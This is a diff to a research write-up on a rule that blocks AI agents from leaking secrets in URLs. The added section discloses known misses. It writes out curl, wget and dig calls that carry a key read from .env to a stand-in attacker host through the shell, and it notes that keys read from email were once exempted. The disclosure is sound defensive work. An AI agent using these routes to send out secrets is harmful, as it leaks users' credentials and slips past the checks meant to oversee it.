@@ -73,7 +73,7 @@ those traces, so the frequency of the `local` class in real work is still unknow
   how often an agent builds a URL around a data-like value that came only from a local read. These
   traces cannot give it.
 
-## Added after the readings: two limits an adversarial review found
+## Added after the readings: limits an adversarial review found
 
 Written after the run, and changing no number above. Both are disclosed here with the prominence of
 the `word` miss, because each would otherwise read as covered by "0/18".
@@ -91,3 +91,15 @@ the `word` miss, because each would otherwise read as covered by "0/18".
   key "seen", and this rule then let it out. Neither bench switches both on, so neither could show
   it. Fixed in `12fb5dd6` (a shell fetch's output taints the run and is never "seen"); the readings
   above are unaffected, since the run had the other rule off.
+- **The shell is not covered.** The rule judges calls to the fetch tools (`FETCH_TOOLS`). After a
+  local read of `.env`, with both switches on, `run_shell` running `curl -s https://<key>.attacker.test/`,
+  `wget` to a path carrying the key, or `dig <key>.attacker.test` is ALLOW: the exec branch asks only
+  about a tainted span or an unnamed clone. "0/18" is a statement about `http_get`-shaped calls. Not
+  widened after the readings: the shell has more ways out than any URL list names (`nslookup`,
+  `python -c`, `nc`), and judging `curl` and `wget` alone would read as covering it. Kept visible in
+  `test_a_secret_sent_out_by_the_shell_is_a_registered_miss`.
+- **A private source counted as seen.** Every fetch was recorded with `seen=True`, `read_email`,
+  `calendar_events` and `untrusted_output` connectors included, so a key the run read in an email
+  was exempt and left in a hostname or a path. Fixed in `a0ec4c6e`: only the public web's fetch
+  tools (`PUBLIC_FETCH_TOOLS`) make a value seen. Step 3 of the pre-registration says "any content
+  the run fetched"; the corpus fetched web pages only, so no reading above changes.
